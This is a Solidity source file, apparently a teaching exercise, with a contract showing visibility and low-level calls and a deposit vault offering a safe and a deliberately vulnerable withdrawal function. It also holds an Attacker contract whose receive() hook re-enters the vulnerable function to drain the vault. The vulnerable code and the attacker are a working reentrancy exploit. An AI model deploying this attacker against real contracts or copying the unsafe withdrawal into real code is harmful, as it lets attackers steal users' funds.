// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISecond {
    function withdrawSafe(address payable holder) external;
    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function increaseBalance() external payable;
    function attack() external payable;
}

interface IFirst {
    function setPublic(uint256 num) external;
    function setPrivate(uint256 num) external;
    function setInternal(uint256 num) external;
    function sum() external view returns (uint256);
    function sumFromSecond(address contractAddress) external returns (uint256);
    function callExternalReceive(address payable contractAddress) external payable;
    function callExternalFallback(address payable contractAddress) external payable;
    function getSelector() external pure returns (bytes memory);
}

contract First is IFirst, Ownable {
    uint256 public ePublic;
    uint256 private ePrivate;
    uint256 internal eInternal;



    function setPublic(uint256 num) external onlyOwner {
        ePublic = num;
    }

    function setPrivate(uint256 num) external onlyOwner{
        ePrivate = num;
    }

    function setInternal(uint256 num) external onlyOwner{
        eInternal = num;
    }

    function sum() external view returns (uint256){
         return ePublic + eInternal + ePrivate;
    }

    function sumFromSecond(address contractAddress) external returns (uint256){
        (bool success, bytes memory data) = contractAddress.call(abi.encodeWithSignature("sum()"));
        require(success);
        return uint256(bytes32(data));
    }

    function callExternalReceive(address payable contractAddress) external payable{
        require(msg.value == 0.0001 ether , "value is not equel to 100000000000000");
        (bool success, ) = contractAddress.call{value: msg.value}("");
        require(success, "not success");
    }

    function callExternalFallback(address payable contractAddress) external payable{
        require(msg.value == 0.0002 ether, "value is not equel to 200000000000000");
        (bool success, ) = contractAddress.call{value: msg.value}(abi.encodeWithSignature("someFunction()"));
        require(success);
    }

    function getSelector() external pure  returns (bytes memory){
        return abi.encodePacked(
            bytes4(keccak256("callExternalFallback(address)")),
            bytes4(keccak256("callExternalReceive(address)")),
            bytes4(keccak256("ePublic()")),
            bytes4(keccak256("getSelector()")),
            bytes4(keccak256("setInternal(uint256)")),
            bytes4(keccak256("setPrivate(uint256)")),
            bytes4(keccak256("setPublic(uint256)")),
            bytes4(keccak256("sum()")),
            bytes4(keccak256("sumFromSecond(address)"))
        );
    }

}

contract Attacker is IAttacker {
    ISecond public secondContract;

    constructor(ISecond secondAddr) {
        secondContract = secondAddr;
    }

    receive() external payable {
        if (address(secondContract).balance != 0 ether) {
            secondContract.withdrawUnsafe(payable(address(this)));
        }
    }

    function increaseBalance() public payable {
        (bool sent, ) = address(secondContract).call{value: msg.value}("cxzcxzgdr");
        require(sent);
    }

    function attack() external payable {
        increaseBalance();
        secondContract.withdrawUnsafe(payable(address(this)));
    }
}

contract Second is Ownable, ISecond{
    mapping(address => uint256) public balance;

    uint256 public ePublic;
    uint256 private ePrivate;
    uint256 internal eInternal;


    function setPublic(uint256 num) external onlyOwner {
        ePublic = num;
    }

    function setPrivate(uint256 num) external onlyOwner{
        ePrivate = num;
    }

    function setInternal(uint256 num) external onlyOwner{
        eInternal = num;
    }

    function sum() external view returns (uint256){
         return ePublic + eInternal + ePrivate;
    }

    function withdrawSafe(address payable holder) external{
        uint _balance = balance[holder];
        require(_balance > 0, "ballanse is zero");

        balance[holder] = 0;

        (bool success, ) = holder.call{value: _balance}("");
        require(success, "not send");
    }

    function withdrawUnsafe(address payable holder) external{
        uint _balance = balance[holder];
        require(_balance > 0, "Less balance");

        (bool success, ) = holder.call{value: _balance}("");
        require(success, "not send");

        balance[holder] = 0;
    }

    receive() external payable {
        
        balance[msg.sender] += msg.value;
    }

    fallback() external  payable {
        
        balance[msg.sender] += msg.value;
    }

    function checkBalance (address _address) external view returns (uint256) {
        return balance[_address];
    } 
}
